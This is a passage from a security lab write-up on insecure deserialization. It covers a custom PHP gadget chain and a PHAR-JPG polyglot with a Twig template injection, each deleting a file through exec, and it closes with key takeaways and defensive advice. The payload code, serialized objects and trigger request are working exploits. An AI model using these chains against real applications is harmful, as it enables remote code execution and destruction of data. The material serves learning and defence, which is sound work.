$CustTemp->default_desc_type = "rm /home/carlos/morale.txt";  // 3. Set command
$CustTemp->desc = $DefMap;                          // 4. Replace desc with DefaultMap
echo serialize($CustTemp);                          // 5. Serialize

?>
```

Execution flow:

```
// Server deserializes:
$obj = unserialize($cookie);

// This triggers:
1. __wakeup() runs automatically
2. build_product() is called
3. new Product("rm /home/carlos/morale.txt", DefaultMap("exec"))
4. Product tries: $DefaultMap->{"rm /home/carlos/morale.txt"}
5. __get() magic method triggers
6. call_user_func("exec", "rm /home/carlos/morale.txt")  ← RCE!
```

Result:

```php
O:14:"CustomTemplate":2:{s:17:"default_desc_type";s:26:"rm /home/carlos/morale.txt";s:4:"desc";O:10:"DefaultMap":1:{s:8:"callback";s:4:"exec";}}
```

Base64 encoding and sending this cookie will solve the lab. 

![](/assets/images/InsecureDeserialization/Pasted%20image%2020260211005155.png)

### 10. Using PHAR deserialization to deploy a custom gadget chain

Description:

We need to use PHAR deserialization to delete the `morale.txt` file.

![](/assets/images/InsecureDeserialization/Pasted%20image%2020260211005247.png)

Explanation:

We log in with the given credentials and upload an avatar.

![](/assets/images/InsecureDeserialization/Pasted%20image%2020260213112010.png)

We see that the avatar gets stored in `/cgi-bin` directory.

![](/assets/images/InsecureDeserialization/Pasted%20image%2020260213111957.png)

We see some files in `/cgi-bin` directory.

![](/assets/images/InsecureDeserialization/Pasted%20image%2020260213112638.png)

We request and read the source code for `/cgi-bin/Blog.php~`. 

![](/assets/images/InsecureDeserialization/Pasted%20image%2020260213112802.png)

Blog.php:

```php
<?php

require_once('/usr/local/envs/php-twig-1.19/vendor/autoload.php');

class Blog {
    public $user;
    public $desc;
    private $twig;

    public function __construct($user, $desc) {
        $this->user = $user;
        $this->desc = $desc;
    }

    public function __toString() {
        return $this->twig->render('index', ['user' => $this->user]);
    }

    public function __wakeup() {
        $loader = new Twig_Loader_Array([
            'index' => $this->desc,
        ]);
        $this->twig = new Twig_Environment($loader);
    }

    public function __sleep() {
        return ["user", "desc"];
    }
}

?>
```

We request and read the source code for `/cgi-bin/CustomTemplate.php~`. 

![](/assets/images/InsecureDeserialization/Pasted%20image%2020260213112739.png)

CustomTemplate.php:

```php
<?php

class CustomTemplate {
    private $template_file_path;

    public function __construct($template_file_path) {
        $this->template_file_path = $template_file_path;
    }

    private function isTemplateLocked() {
        return file_exists($this->lockFilePath());
    }

    public function getTemplate() {
        return file_get_contents($this->template_file_path);
    }

    public function saveTemplate($template) {
        if (!isTemplateLocked()) {
            if (file_put_contents($this->lockFilePath(), "") === false) {
                throw new Exception("Could not write to " . $this->lockFilePath());
            }
            if (file_put_contents($this->template_file_path, $template) === false) {
                throw new Exception("Could not write to " . $this->template_file_path);
            }
        }
    }

    function __destruct() {
        @unlink($this->lockFilePath());
    }

    private function lockFilePath()
    {
        return 'templates/' . $this->template_file_path . '.lock';
    }
}

?>
```

We see a reference to twig in the `Blog.php` file. Searching online, we can see there is a Server Side Template Injection in twig.

![](/assets/images/InsecureDeserialization/Pasted%20image%2020260213113735.png)

We can use the phar-jpg-polyglot exploit from github to generate an image with the embedded payload - [https://github.com/kunte0/phar-jpg-polyglot/blob/master/phar_jpg_polyglot.php](https://github.com/kunte0/phar-jpg-polyglot/blob/master/phar_jpg_polyglot.php)

![](/assets/images/InsecureDeserialization/Pasted%20image%2020260213114542.png)

We will use this exploit code:

```php
class CustomTemplate {}
class Blog {}
$object = new CustomTemplate;
$blog = new Blog;
$blog->desc = '{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("rm /home/carlos/morale.txt")}}';
$blog->user = 'carlos';
$object->template_file_path = $blog;
```

We put this code in place of the code under `//pop exploit class`.

![](/assets/images/InsecureDeserialization/Pasted%20image%2020260213115544.png)

Running the code will generate the serialized payload and embed it in the output image.

![](/assets/images/InsecureDeserialization/Pasted%20image%2020260213120437.png)

We need to upload the image.

![](/assets/images/InsecureDeserialization/Pasted%20image%2020260213115922.png)

After we send a GET request to `/cgi-bin/avatar.php?avatar=phar://wiener`, it solves the lab.

![](/assets/images/InsecureDeserialization/Pasted%20image%2020260213120546.png)

When we resend the request we see that the response says that the `morale.txt` file doesn't exist, meaning it was deleted.

![](/assets/images/InsecureDeserialization/Pasted%20image%2020260213120601.png)

## Conclusion

These 10 labs demonstrated the diverse and critical nature of insecure deserialization vulnerabilities across different programming languages and frameworks. Key takeaways include:

- Simple Cookie Manipulation Works: Many applications trust serialized session cookies without validation, allowing privilege escalation by simply changing `admin=false` to `admin=true`
- Type Juggling is Powerful: PHP's loose comparison allows `0 == "any_string"` to bypass authentication when combined with deserialization
- Magic Methods are Dangerous: Automatic execution of `__destruct()`, `__wakeup()`, and `readObject()` enables attackers to trigger unintended code
- Gadget Chains are Universal: Pre-built tools like ysoserial and PHPGGC make exploiting common frameworks trivial
- Custom Chains Require Source Code: Building custom gadget chains demands analyzing leaked source to chain magic methods together
- PHAR is Sneaky: Even innocent file operations can trigger deserialization when using the `phar://` wrapper
- Signatures Can Be Forged: Signed cookies only protect if the secret key stays secret leaked keys enable full forgery
- SQL Injection Via Deserialization: The Java lab showed how deserialization can be a vector for traditional vulnerabilities like SQLi

What made these labs particularly instructive was the progression from basic exploitation to advanced techniques. Starting with simple cookie manipulation in PHP (flipping boolean flags), moving through type juggling and application functionality abuse, then escalating to pre-built gadget chains with ysoserial and PHPGGC, before culminating in custom gadget chain development for both Java and PHP. The final PHAR lab tied everything together by showing how deserialization can hide in unexpected places not just in obvious `unserialize()` calls but in file system operations.

The Java SQL injection lab (Lab 8) was especially notable because it demonstrated that insecure deserialization isn't always about achieving direct RCE through gadget chains. Sometimes the vulnerability is in what happens during deserialization in this case, a `readObject()` method that performs unsafe SQL queries using attacker-controlled data. This reinforced that deserialization creates a much broader attack surface than just code execution.

The custom gadget chain labs (#8-10) showed the importance of source code analysis. Without understanding how classes interact which magic methods call which property methods building exploits is nearly impossible. But with leaked source code (a surprisingly common occurrence through backup files, exposed `.git` directories, or decompilation), attackers can methodically trace data flow from deserialization through magic methods to dangerous sinks like `exec()`, `unlink()`, or database queries.

Insecure deserialization is OWASP's A8:2017 for good reason it's difficult to detect with automated scanners, often leads to complete server compromise, and remains prevalent in legacy code. Unlike SQL injection or XSS where input validation can mitigate risk, deserialization vulnerabilities are architectural. The only real solution is to avoid deserializing untrusted data entirely. Use JSON for data exchange, implement cryptographic signatures with rotating keys, and if native serialization is unavoidable, whitelist allowed classes and validate all properties after deserialization.

These labs showed that no language is immune PHP, Java, and Ruby all have dangerous serialization mechanisms. The attack patterns are similar: identify serialized data (often in cookies), decode it, modify it for privilege escalation or inject malicious objects, then leverage magic methods or gadget chains to achieve code execution. The key defense: never trust serialized data from users, and if you must deserialize it, treat it with the same suspicion as `eval(user_input)`.
